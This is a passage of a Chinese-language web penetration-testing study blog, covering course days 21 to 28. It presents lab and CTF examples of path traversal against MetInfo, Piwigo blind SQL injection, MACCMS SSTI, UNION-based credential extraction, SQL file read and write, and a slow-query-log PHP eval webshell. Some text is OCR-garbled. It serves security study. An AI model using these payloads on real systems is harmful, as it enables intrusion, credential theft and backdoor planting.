class="title function_ invoke__">flush</span>();</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以使用双写进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/MetInfo6.0.0/include/thumb.php?dir=…///http…///config\config_db.php</span><br><span class="line"></span><br><span class="line">/MetInfo/include/thumb.php?dir=.....///http\.....//\config\config_db.php</span><br></pre></td></tr></table></figure>

<p>经过过滤后变成了 <a target="_blank" rel="noopener" href="http://127.0.0.1/MetInfo6.0.0/include/thumb.php?dir=%E2%80%A6/http%E2%80%A6/config%5Cconfig_db.php">http://127.0.0.1/MetInfo6.0.0/include/thumb.php?dir=…/http…/config\config_db.php</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/5f41dabeda66c8cc8e5875e43621f7e5--1cc9--image-20240404193535385.png" alt="image-20240404193535385">拓展链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_63241485/article/details/126580849">https://blog.csdn.net/m0_63241485/article/details/126580849</a></p>
<h6 id="开源相册piwigo-sql注入漏洞"><a href="#开源相册piwigo-sql注入漏洞" class="headerlink" title="开源相册piwigo sql注入漏洞"></a>开源相册piwigo sql注入漏洞</h6><p>原理：漏洞的分析看起来比较简单，是由于functions_rate.inc.php文件中的rate_picture函数没有对传入的$rate变量进行过滤，直接拼接到SQL中执行：代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO &#x27;</span>.RATE_TABLE.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&#x27;</span></span><br><span class="line">    .<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$anonymous_id</span>.<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$image_id</span>.<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$rate</span></span><br><span class="line">    .<span class="string">&#x27;,NOW())</span></span><br><span class="line"><span class="string">;&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">pwg_query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">update_rating_score</span>(<span class="variable">$image_id</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO &#x27;</span>.RATE_TABLE.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&#x27;</span></span><br><span class="line">    .<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$anonymous_id</span>.<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$image_id</span>.<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$rate</span></span><br><span class="line">    .<span class="string">&#x27;,NOW())</span></span><br><span class="line"><span class="string">;&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">pwg_query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">update_rating_score</span>(<span class="variable">$image_id</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>判断r a t e 是否是 rate是否是rate是否是conf[‘rate_items’]的项。而后面这个数组的值是配置文件里写死的。</p>
<p>看起来这句的功能是设置了一个rate变量的白名单。只能是0,1,2,3,4,5其中之一。这样子应该很安全才对。当然事实证明这样子写是不安全的。rate&#x3D;” 5′aaaaaaaaaaaaaaaaa” 时， inarray( rate &#x3D; “5’aaaaaaaaaaaaaaaaa “时，in_array(rate&#x3D;”5 ′aaaaaaaaaaaaaaaaa”时，inarray(rate, $conf[‘rate_items’]) 这个判断是返回True的。这是php里不同类型变量比较时候的一个特性。只要rate为array(0,1,2,3,4,5)便可以进行绕过，而in_array第三位未设置为true<br>1,1 and if(ascii(substr((select database()),1,1))&#x3D;112,1,sleep(3)));#<br>简言之：当字符串跟整型变量使用”&#x3D;&#x3D;”比较的时候，会将字符串转换成整型，再进行比较。</p>
<h1 id="第21天-WEB攻防-JavaWeb项目-JWT身份攻击-组件安全-访问控制"><a href="#第21天-WEB攻防-JavaWeb项目-JWT身份攻击-组件安全-访问控制" class="headerlink" title="第21天 WEB攻防-JavaWeb项目&amp;JWT身份攻击&amp;组件安全&amp;访问控制"></a>第21天 WEB攻防-JavaWeb项目&amp;JWT身份攻击&amp;组件安全&amp;访问控制</h1><h4 id="知识点：-6"><a href="#知识点：-6" class="headerlink" title="知识点："></a>知识点：</h4><p>1、JavaWeb常见安全及代码逻辑(通过抓包找到网站页面对应的文件地址以及功能代码)<br>2、目录遍历&amp;身份验证&amp;逻辑&amp;JWT<br>3、访问控制&amp;安全组件&amp;越权&amp;三方组件</p>
<h4 id="演示案例：-3"><a href="#演示案例：-3" class="headerlink" title="演示案例："></a>演示案例：</h4><h6 id="JavaWeb-WebGoat8靶场搭建使用"><a href="#JavaWeb-WebGoat8靶场搭建使用" class="headerlink" title="JavaWeb-WebGoat8靶场搭建使用"></a>JavaWeb-WebGoat8靶场搭建使用</h6><p>搭建：下载jar包–使用java -jar webgoat-server-8.0.0.M26.jar –server.port&#x3D;9091 开启–浏览器访问127.0.0.1:9091&#x2F;WebGoat&#x2F;login.html 即可<br>详细搭建步骤见：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50012220/article/details/119209336">https://blog.csdn.net/weixin_50012220/article/details/119209336</a>          –好像搭建还得需要高点版本的java环境，java8和java11都不太行，而且搭建在虚拟机上好像是不能从本地上去访问到的。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-05/091f0354f3dfee15ffed99be242aef22--27f7--image-20240405104254959.png" alt="image-20240405104254959"></p>
<h6 id="安全问题-目录遍历-身份认证-JWT攻击"><a href="#安全问题-目录遍历-身份认证-JWT攻击" class="headerlink" title="安全问题-目录遍历&amp;身份认证-JWT攻击"></a>安全问题-目录遍历&amp;身份认证-JWT攻击</h6><p>1、上传文件时的目录遍历<br>通过上传回显和目标路径比较发现需要将文件上传到上一级目录–使用burp改包–…&#x2F;text<br>双写绕过</p>
<p>#身份认证<br>键值逻辑：使用键名键值进行对比验证错误<br>-JWT攻击：</p>
<p>1、签名没验证空加密</p>
<p>2、爆破密匙</p>
<p>3、KID利用<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vege/p/14468030.html">https://www.cnblogs.com/vege/p/14468030.html</a><br>此处因为赋值是写死的，而不是带入数据库中查询，所以可以通过修改键名称绕过（s2&#x3D;null and s3&#x3D;null 为真）</p>
<p>#访问控制<br>隐藏属性：前端页面的自慰限制显示<br>水平越权：同一级别用户权限的查看</p>
<h6 id="安全问题-访问控制-安全组件第三方组件"><a href="#安全问题-访问控制-安全组件第三方组件" class="headerlink" title="安全问题-访问控制&amp;安全组件第三方组件"></a><strong>安全问题-访问控制&amp;安全组件第三方组件</strong></h6><p>#安全组件<br>联想到前几年的Log4j2<br>#环境下载：<br><a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p>
<h1 id="第22天-WEB攻防-JS项目-Node-JSi框架安全8识别审计-验证绕过"><a href="#第22天-WEB攻防-JS项目-Node-JSi框架安全8识别审计-验证绕过" class="headerlink" title="第22天 WEB攻防-JS项目&amp;Node.JSi框架安全8识别审计&amp;验证绕过"></a>第22天 WEB攻防-JS项目&amp;Node.JSi框架安全8识别审计&amp;验证绕过</h1><h4 id="知识点：-7"><a href="#知识点：-7" class="headerlink" title="知识点："></a>知识点：</h4><p>1、原生JS开发框架-安全条件<br>2、常见安全问题-前端验证：未授权</p>
<h4 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h4><h6 id="1、什么是Js渗透测试？"><a href="#1、什么是Js渗透测试？" class="headerlink" title="1、什么是Js渗透测试？"></a>1、什么是Js渗透测试？</h6><p>在Javascript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞<br>JS开发的WEB应用和PHP,JAVA,NET等区别在于即没有源代码，也可以通过浏览器的查看<br>源代码获取真实的点。所以相当于JS开发的NEB应用属于白盒测试（默认有源码参考）</p>
<h6 id="3、如何判定JS开发应用？"><a href="#3、如何判定JS开发应用？" class="headerlink" title="3、如何判定JS开发应用？"></a>3、如何判定JS开发应用？</h6><p>插件wappalyzer<br>源代码简短<br>引入多个文件<br>一股有&#x2F;static&#x2F;js&#x2F;app.js等顺序的j文件<br>cookie中有connect.sid</p>
<h6 id="4、如何获取更多的JS文件？"><a href="#4、如何获取更多的JS文件？" class="headerlink" title="4、如何获取更多的JS文件？"></a>4、如何获取更多的JS文件？</h6><p>JsFinder<br>Packer-Fuzzer<br>扫描器后缀替换字典</p>
<h6 id="5、如何快速获取价值代码？"><a href="#5、如何快速获取价值代码？" class="headerlink" title="5、如何快速获取价值代码？"></a>5、如何快速获取价值代码？</h6><p>method:“get”<br>http.get(“<br>method:“post”</p>
<p>$.ajax</p>
<p>service.httphost</p>
<p>service.httget</p>
<h4 id="演示案例：-4"><a href="#演示案例：-4" class="headerlink" title="演示案例："></a>演示案例：</h4><h6 id="安全条件可控变量-特定函数"><a href="#安全条件可控变量-特定函数" class="headerlink" title="安全条件可控变量&amp;特定函数"></a><strong>安全条件可控变量&amp;特定函数</strong></h6><h6 id="开发框架-Vulhub-Node-JS安全"><a href="#开发框架-Vulhub-Node-JS安全" class="headerlink" title="开发框架-Vulhub-Node.JS安全"></a><strong>开发框架-Vulhub-Node.JS安全</strong></h6><p>搭建vulhub靶场 存在任意文件读取漏洞–可读取服务器用户密码</p>
<h6 id="真实应用-APP应用直接重置密码"><a href="#真实应用-APP应用直接重置密码" class="headerlink" title="真实应用-APP应用直接重置密码"></a><strong>真实应用-APP应用直接重置密码</strong></h6><p>期货APP通过修改前端JS验证码绕过验证码认证、未授权访问</p>
<h6 id="真实应用-违法彩彩文件上传安全"><a href="#真实应用-违法彩彩文件上传安全" class="headerlink" title="真实应用-违法彩彩文件上传安全"></a><strong>真实应用-违法彩彩文件上传安全</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扩展：CTF比赛中和js相关的主要就是js的原型链污染，以及沙盒逃逸，这两种其实都是差不多的原理，通过非法修改变量的值去达到一些非法的作用。</span><br></pre></td></tr></table></figure>

<h1 id="第23天-WEB攻防-Python考点-CTF与CMS-SSTI模版注入-PYC反编译"><a href="#第23天-WEB攻防-Python考点-CTF与CMS-SSTI模版注入-PYC反编译" class="headerlink" title="第23天 WEB攻防-Python考点&amp;CTF与CMS-SSTI模版注入&amp;PYC反编译"></a>第23天 WEB攻防-Python考点&amp;CTF与CMS-SSTI模版注入&amp;PYC反编译</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13653563.html">https://www.cnblogs.com/bmjoker/p/13653563.html</a>       ssti实战</p>
<h4 id="知识点：-8"><a href="#知识点：-8" class="headerlink" title="知识点："></a>知识点：</h4><p>1、PYC文件反编译<br>2、Python-web-ssrr<br>3、SSr1模版注入利用分析</p>
<h4 id="演示案例：-5"><a href="#演示案例：-5" class="headerlink" title="演示案例："></a>演示案例：</h4><p>PY反编译-PYC编译文件反编译源码<br>SST1入门-原理&amp;分类&amp;检测&amp;分析&amp;利用<br>SsTi考点-CTF靶场-WestemnCTF日shrine<br>SST1考点-CMS源码-MACCMS V8.X执行<br>PY反编译-PYC编译文件反编译源码</p>
<h6 id="Pyc文件是py文件编译后生成的字节码文件-byte-code-Pyc文件经过pythonf解释器"><a href="#Pyc文件是py文件编译后生成的字节码文件-byte-code-Pyc文件经过pythonf解释器" class="headerlink" title="#Pyc文件是py文件编译后生成的字节码文件(byte code),Pyc文件经过pythonf解释器"></a>#Pyc文件是py文件编译后生成的字节码文件(byte code),Pyc文件经过pythonf解释器</h6><p>最终会生成机器码运行，因此pyc文件是可以跨平台部署的，类似Java的。c1a3文件，<br>一股如y文件改变后，都会重新生成中yc文件。<br>真题附件：<a target="_blank" rel="noopener" href="http://pan.ba1du.com/s/1jGgB8Ds">http://pan.ba1du.com/s/1jGgB8Ds</a><br>反编译平台：<br><a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a><br><a target="_blank" rel="noopener" href="http://tools.bugscaner.com/decompyle/">http://tools.bugscaner.com/decompyle/</a><br>反编译工具：<a target="_blank" rel="noopener" href="https://g1thub.com/w1b1t1/uncompy1e2">https://g1thub.com/w1b1t1/uncompy1e2</a></p>
<h6 id="SSTI入门-原理-分类-检测-分析-利用"><a href="#SSTI入门-原理-分类-检测-分析-利用" class="headerlink" title="#SSTI入门-原理&amp;分类&amp;检测&amp;分析&amp;利用"></a>#SSTI入门-原理&amp;分类&amp;检测&amp;分析&amp;利用</h6><p>1、什么是SSTI?有什么漏司危害？</p>
<p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为Web应用模<br>板内容的一部分，模板引擎在进行目标编泽這染的过程中，执行了用户播入的可以破怀模<br>板的语句，因而可影导数了散感信息泄露、代码执行、GetShe11等问题。其影响范围主<br>要取决于模版引擎的复杂性。<br>2、如何判断检测SSTI漏河的存在？<br>输入的数据会被浏览器利用当前脚本语言调用解析执行<br>3、SSTI会产生在那些语言开发应用？<br>-见上图<br>4、SSTI安全问题在生产环境那里产生？<br>存在模版引用的地方，如404错误页面展示<br>存在数据接收引用的地方，如模版解析获取参数数据<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/houyanhua1/article/details/85470175">https://blog.csdn.net/houyanhua1/article/details/85470175</a><br>url_for（）函数是用于构建操作指定函数的URL<br>get_flashed_messages（）函数是获取传递过来的数据<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;<br>&#x2F;shrine&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#SSTI考点-CMs源码-MACCMS V8.X执行</span><br><span class="line">Payload:index.php?m=vod-searchswd=(if-dddd:phpinfo（）](endif-dddd</span><br><span class="line">1、根据传递的代码找指向文件</span><br><span class="line">2.index-&gt;vod-&gt;tpl-&gt;ifex-&gt;eval</span><br><span class="line">3、构适Payload带入ifex并绕过后执行</span><br><span class="line">实战中一般通过白盒审计代码明确变量，黑盒测试中很难发现。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">扩展：</span><br><span class="line">ssti作为ctf中常出现的题目，有着许多的变化等，也要多去看看。</span><br><span class="line">https://blog.csdn.net/qq_35493457/article/details/119938852  flask ssti</span><br><span class="line">https://www.cnblogs.com/bmjoker/p/13508538.html   ssti入门</span><br></pre></td></tr></table></figure>

<h1 id="第24天-WEB攻防-通用漏洞-SQL注入-MYSQL跨库-ACCESS偏移"><a href="#第24天-WEB攻防-通用漏洞-SQL注入-MYSQL跨库-ACCESS偏移" class="headerlink" title="第24天 WEB攻防-通用漏洞&amp;SQL注入&amp;MYSQL跨库&amp;ACCESS偏移"></a>第24天 WEB攻防-通用漏洞&amp;SQL注入&amp;MYSQL跨库&amp;ACCESS偏移</h1><h4 id="知识点：-9"><a href="#知识点：-9" class="headerlink" title="知识点："></a>知识点：</h4><p>1、脚本代码与数据库前置知识<br>2、Acce33数据库注入-简易偏移<br>3、MYSQL数据库注入-简易&amp;权限跨库</p>
<h4 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>-SQL工注入漏洞产生原理分析<br>-SQL工注入漏洞危害利用分析<br>-脚本代码与数据库操作流程<br>-数据库名，表名，列名，数据<br>-数据库类型，数据库用户，用户权限</p>
<p>为了网站和数据库的安全性，MYSQL内置有ROOT最高用户，划分等级，每个用户对应管理<br>一个数据库，这样保证无不关联，从而不会影响到其他数据库的运行。<br>MYSQL两种思路：<br>1、非ROOT的注入攻击：常规类的猜解<br>2、RO0T用户的注入攻击：文件读写操作，跨库查询注入等</p>
<p><strong>MYSQL5.0以上版本：自带的数据库名information schema</strong><br><strong>information schema:存储数据库下的数据库名及表名，列名信息的表</strong><br>获取相关数据：<br>l、数据库版本-看是否符合information schemai查询 version()<br>2、数据库用户-看是否符合ROOT型注入攻击 user()<br>3、当前操作系统-看是否支持大小写或文件路径选择 @@version_compile_os()<br>4、数据库名 为后期查询表名和列名做准备 database()<br>ROOT类型攻击-猜解数据，文件读写，跨库查询<br>获取当前数据库下面的表名信息：<br>UNION SELECT table name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information schema.tables where table schema&#x3D;‘syguestbook’<br>获取表名syadminuser的列名信息：<br>UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information_schema.columms where table_name&#x3D;’sy_adminuser’I<br>and table schema&#x3D;‘syguestbook’<br>获取指定数据：<br>UNION SELECT username,password,<br>3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from sy adminuser<br>跨库注入：实现当前网站跨库查询其他数据库对应网站的数据<br>获取当前mysq1下的所有数据库名<br>UNION SELECT schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information_schema.schmata<br>获取数据库名xhcms下的表名信息<br>UNION SELECT table_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information schema.tables where table_schema&#x3D;‘xhcms’<br>获取数据库名xhcms下的表manage下的列名信息：<br>UNION SELECT column_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from information schema.columns where table_name&#x3D;’manage’and<br>table schema&#x3D;’xhcms<br>获取指定数据：<br>UNI0 N SELECT user,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>from xhcms</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">演示案例</span><br><span class="line">ASP+Access-简易注入-字典猜解</span><br><span class="line">由于access数据库特性导致这个SQL注入是需要借助字典去猜解表名和列名的，那么就会</span><br><span class="line">出现表名或列名猜解不到，可以自定义社工字典或采用偏移注入。</span><br><span class="line">ASP+Access-偏移注入-报错显示</span><br><span class="line">偏移注入就是解决表名已知，列名未知的情况！</span><br><span class="line">PHP+MYSOL-简易注入-存储特性</span><br><span class="line">使用高权限账户可以对数据库进行读取和写入</span><br><span class="line">PHP+MYSOL-跨库注入-权限属性</span><br><span class="line">使用高权限账户可以实现对mysql其他数据库进行注入</span><br></pre></td></tr></table></figure>

<h1 id="第25天-WEB攻防-通用漏洞-SQL读写注入-MYSQL-MSSQL-PostgreSQL"><a href="#第25天-WEB攻防-通用漏洞-SQL读写注入-MYSQL-MSSQL-PostgreSQL" class="headerlink" title="第25天 WEB攻防-通用漏洞&amp;SQL读写注入&amp;MYSQL&amp;MSSQL&amp;PostgreSQL"></a>第25天 WEB攻防-通用漏洞&amp;SQL读写注入&amp;MYSQL&amp;MSSQL&amp;PostgreSQL</h1><h4 id="知识点：-10"><a href="#知识点：-10" class="headerlink" title="知识点："></a>知识点：</h4><p>1、SQL注入-MYSQL数据库<br>2、SQL注入-MSSQ数据库<br>3、SQL注入-PostgreSQL数据库</p>
<h4 id="演示案例：-6"><a href="#演示案例：-6" class="headerlink" title="演示案例："></a>演示案例：</h4><p>MYSQL-root高权限读写注入<br>PostgreSQL-高权限读写注入<br>MSSQL-sa高权限读写执行注入<br>结尾彩蛋某Q牌违法登陆框注入</p>
<h4 id="详细点：-1"><a href="#详细点：-1" class="headerlink" title="#详细点："></a>#详细点：</h4><p>Access无高权限注入点-只能猜解，还是暴力猜解<br>MYSQL,PostgreSQL,MSSQL高权限注入点-可升级读写执行等<br>读取文件：<br>UNION SELECT1,load file(‘d:w.txt),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17<br>写入文件：<br>UNION SELECT 1,‘xxxx’,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile ‘d:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt’/">www.txt’</a><br>-路径获取：phpinfo,报错，字典等<br>-无法写入：secure_fle_priv突破 需要支特SQL执行环境，没有就需要借助      <a target="_blank" rel="noopener" href="https://www.cnblogs.com/c1e4r/articles/8902444.html%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">https://www.cnblogs.com/c1e4r/articles/8902444.html参考文章</a><br>phpmyadmin3或能够直接连上对方数据库进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1; 启用日志慢记录</span><br><span class="line">set global slow.query.log_fle=‘shelli路径’； 将操作记录写入到执行路径文件</span><br><span class="line">select’&lt;?php eval($_GET[A])?&gt;&#x27;or SLEEP(11); 将后门语句执行写入到慢日志文件</span><br><span class="line">与文件包含中的日志文件包含有所类似</span><br></pre></td></tr></table></figure>

<p>#PostgreSQL-高权限读写注入<br>测列数：<br>order by 4<br>and 1&#x3D;2 union select null,null,null,null<br>测显位：第2,3</p>
<p>and1&#x3D;2 union select’nul’,null,null,null错误<br>and1&#x3D;2 union select null,.‘nul’,null,null正常<br>and 1&#x3D;2 union select null,null,‘null’,nullE<br>and1&#x3D;2 union select null,.null,null,’nul’错误<br>获取信息：<br>and 1&#x3D;2 UNION SELECT null,version(,null,null<br>and 1&#x3D;2 UNION SELECT null,current user,null,null<br>and 1&#x3D;2 union select null,current database（）,null,null<br>获取数据库名：<br>and 1&#x3D;2 union select null,string_agg(datname,),null,null from pg_database</p>
<p>#MSSQL-sa高权限读写执行注入<br>测列数：<br>order by 4<br>and 1&#x3D;2 union all select null.null.null,null<br>测显位：<br>and 1&#x3D;2 union all select null.1.null.null<br>and 1&#x3D;2 union all select null.null,’s’null<br>获取信息：<br>@@version获取版本信息<br>db name(0当前数据库名字<br>user、system_user,current user,user name获取当前用户名<br>@@SERVERNAME获取服务器主机信息<br>and 1&#x3D;2 union all select null,db_name（）,null,null</p>
<h1 id="第27天-WEB攻防-通用漏洞-SQL注入-Tamper脚本-Base64-Json-md5等"><a href="#第27天-WEB攻防-通用漏洞-SQL注入-Tamper脚本-Base64-Json-md5等" class="headerlink" title="第27天 WEB攻防-通用漏洞&amp;SQL注入&amp;Tamper脚本&amp;Base64&amp;Json&amp;md5等"></a>第27天 WEB攻防-通用漏洞&amp;SQL注入&amp;Tamper脚本&amp;Base64&amp;Json&amp;md5等</h1><h4 id="知识点：-11"><a href="#知识点：-11" class="headerlink" title="知识点："></a>知识点：</h4><p>1、数据表现格式类型注入<br>2、字符转义绕过-宽字节注入<br>3、数字&amp;字符&amp;搜索&amp;编码&amp;加应等</p>
<h5 id="参考资料："><a href="#参考资料：" class="headerlink" title="#参考资料："></a>#参考资料：</h5><p>:star:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a></p>
<h4 id="演示案例：-7"><a href="#演示案例：-7" class="headerlink" title="演示案例："></a>演示案例：</h4><h6 id="本地源码数字-字符-搜索-编码-JSON"><a href="#本地源码数字-字符-搜索-编码-JSON" class="headerlink" title="本地源码数字&amp;字符&amp;搜索&amp;编码&amp;JSON"></a>本地源码数字&amp;字符&amp;搜索&amp;编码&amp;JSON</h6><p>数字型 0-9 字符型 a-z中文标点符号加入了单引号（单引号闭合 1‘ and 1&#x3D;1 –+）<br>搜索型 在基础上又加入的通配符（%’闭合）<br>编码型 数据以编码值传递 加密型 数据以加密后的密文去传递（对注入语句进行加解密后代入）<br>格式型 json （单引号闭合 1‘ and 1&#x3D;1 –+） （需要按照类型进行闭合或加解密构造符合数据库查询的条件去输入）<br>数据进行编码接受处理： 发送编码值，对方常会进行解码后带入数据在进行SQL执行<br>在注入的时候，我们也要尝试对注入的Payloadi进行编码后提交<br>#sqlmap在使用时可以判断出注入点类型是否为数字型、搜索型或者字符型，但是对编码型的注入无法自动判断，所以需要引用tamper脚本进行编码 例如对参数进行base64编码的网站进行sql注入测试的时候可以使用 –tamper&#x3D;enbase64.py进行加密</p>
<h6 id="墨者靶场字符转义处理防护-宽字节注入"><a href="#墨者靶场字符转义处理防护-宽字节注入" class="headerlink" title="墨者靶场字符转义处理防护-宽字节注入"></a>墨者靶场字符转义处理防护-宽字节注入</h6><p>网站会对传入的参数进行部分转译，比如：<a target="_blank" rel="noopener" href="http://localhost:8081/blog/news.php?gtpl=simple%E2%80%99order">http://localhost:8081/blog/news.php?gtpl=simple’order</a><br>by 17–+ 转译为selectfrom sy_guestbook where gTpl&#x3D;‘simple’ order by17–+ 致使查询失败<br>在构造闭合前输入 %df 会使查询变为selectfrom sy_guestbook where gTpl&#x3D;‘simple♦’ order by 17–+ （方块在此处为2个字节会覆盖此处的\从而实现绕过）<br>在PHP中存在魔术引号开关magic_quotes_gpc，开启后会对传入参数中的 单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符都会被加上反斜线<br>所以在面对宽字节注入是可以使用sqlmap中的–tamper&#x3D;unmagciquotes.py脚本进行绕过</p>
<h6 id="真实WEB-数据编码接受处理-base64注入"><a href="#真实WEB-数据编码接受处理-base64注入" class="headerlink" title="真实WEB-数据编码接受处理-base64注入"></a>真实WEB-数据编码接受处理-base64注入</h6><p>#sqlmap在使用时可以判断出注入点类型是否为数字型、搜索型或者字符型，但是对编码型的注入无法自动判断，所以需要引用tamper脚本进行编码 例如对参数进行base64编码的网站进行sql注入测试的时候可以使用 –tamper&#x3D;enbase64.py进行加密</p>
<p>真实WEB-JSON数据格式&amp;MD5加密数据<br>工具脚本-SQLMAP-脚本Tamper使用指南              ————可以去看看ctfshow的ctf题目，有一小段专题就是讲这个的</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a>    很好的一篇文章，可以熟练掌握sqlmap的使用。</p>
<h1 id="第28天-WEB攻防-通用漏洞-SQL注入-HTTP头XFF-COOKIE-POST清求"><a href="#第28天-WEB攻防-通用漏洞-SQL注入-HTTP头XFF-COOKIE-POST清求" class="headerlink" title="第28天 WEB攻防-通用漏洞&amp;SQL注入&amp;HTTP头XFF&amp;COOKIE&amp;POST清求"></a>第28天 WEB攻防-通用漏洞&amp;SQL注入&amp;HTTP头XFF&amp;COOKIE&amp;POST清求</h1><p>知识点：<br>1、数据请求方式-GET&amp;POST&amp;COOKIE等<br>2、常见功能点请求方式-用户登录&amp;1P记录等<br>3、黑盒白盒注入测试要点-SQLMAP注入参数</p>
<p>补充点：<br>黑盒测试：功能点分析<br>白盒测试：功能点分析&amp;关键代码追踪</p>
<p>1.数据库注入-access mysql mssql oracle mongodb postgresq等<br>2.数培类型注入-数字型字符型搜索型加密型(base64js0n)等<br>3.提交方式注入-get post cookie http头等<br>4查询方式注入-查询增加删测除更新堆叠等<br>5.复杂注入利用-二次注入dnslog注入绕过bypass等</p>
<p>演示案例：<br>GET&amp;POST&amp;COOKIE&amp;SERVER<br>实例黑盒-后台表单登陆框-POST注入<br>实例白盒-ESPCMS-商品购买-COOKIE注入<br>实例白盒-ZZCMS-IP记录功能-HTTP头XFF注入         <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48511129/article/details/122692991">https://blog.csdn.net/qq_48511129/article/details/122692991</a><br>此处登录失败会从全局变量获取客户端ip–当密码失败次数过多禁止登录–通过抓包修改x-for-word字段绕过</p>
<p>#部分语言接受代码块</p>
